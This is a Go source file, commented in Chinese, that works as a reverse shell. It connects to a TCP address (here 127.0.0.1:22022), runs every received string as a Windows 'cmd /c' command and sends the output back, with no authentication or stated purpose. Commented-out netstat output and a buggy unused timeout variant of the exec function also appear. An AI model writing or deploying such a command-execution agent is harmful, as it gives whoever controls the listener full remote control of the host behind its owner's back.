package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	// 	flag := `

	// 	TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1876
	//   TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
	//   TCP    0.0.0.0:902            0.0.0.0:0              LISTENING       6896
	//   TCP    0.0.0.0:912            0.0.0.0:0              LISTENING       6896
	//   TCP    0.0.0.0:1680           0.0.0.0:0              LISTENING       6824
	//   TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING       3004
	//   TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       11272
	//   TCP    0.0.0.0:5426           0.0.0.0:0              LISTENING       4
	//   TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       5528
	//   TCP    0.0.0.0:7890           0.0.0.0:0              LISTENING       19104
	//   TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       1488
	//   TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1372
	//   TCP    0.0.0.0:49668
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1
	//   1

	// 	`
	// 配置客户端
	conn, err := net.Dial("tcp", "127.0.0.1:22022")
	if err != nil {
		fmt.Println("客户端创建失败:", err)
		return
	}

	defer conn.Close()

	for {
		buf := make([]byte, 4096)
		n, err := conn.Read(buf[:])
		if err != nil {
			fmt.Println("recv failed, err:", err)
			return
		}
		commend := string(buf[:n])
		fmt.Println("接收到数据:", commend)
		result := Exec(commend)

		conn.Write([]byte(result))
	}
}

func Exec(commend string) string {

	cmd := exec.Command("cmd", "/c", commend)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("命令执行失败", err)
	}
	fmt.Println(string(out))

	cmd.Wait()
	return string(out)
}

// func Exec(commend string) string {
// 	// 创建命令对象
// 	cmd := exec.Command("cmd", "/c", commend)

// 	// 设置命令执行超时时间为 5 秒
// 	timeout := 10 * time.Second

// 	// 创建一个通道，用于接收命令执行结果和错误信息
// 	result := make(chan []byte)
// 	errch := make(chan error)
// 	// 启动命令并监控超时
// 	go func() {
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			errch <- err
// 		} else {
// 			result <- out
// 		}

// 	}()
// 	// 监听结果和超时
// 	select {
// 	case out := <-result:
// 		fmt.Println("命令执行成功")
// 		return string(out)
// 	case err := <-result:
// 		fmt.Println("命令执行失败:", string(err))
// 		break
// 	case <-time.After(timeout):
// 		// 超时处理
// 		cmd.Process.Kill()
// 		fmt.Println("命令执行超时")
// 		return string(<-result)
// 	}

// 	// 等待命令执行完毕并释放资源
// 	// cmd.Wait()
// 	out := <-result
// 	if out == nil {
// 		return "执行失败"
// 	}
// 	return string(out)
// }
